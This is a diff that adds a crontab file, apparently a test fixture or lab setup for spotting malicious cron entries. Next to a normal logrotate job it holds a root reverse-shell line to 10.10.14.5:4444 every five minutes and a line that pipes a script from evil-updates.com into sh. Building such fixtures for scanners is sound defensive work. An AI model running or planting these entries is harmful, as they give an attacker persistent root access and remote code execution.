@@ -1,0 +1,16 @@
+# Standard system crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# Benign task
+0 5 * * * root /usr/sbin/logrotate /etc/logrotate.conf
+
+# Active reverse shell persistence
+*/5 * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Suspicious payload downloader
+0 */6 * * * admin curl -s http://evil-updates.com/agent.sh | sh
+
+# Writable cron file simulation
+0 0 * * * root python3 -c "import socket;print('connected')"
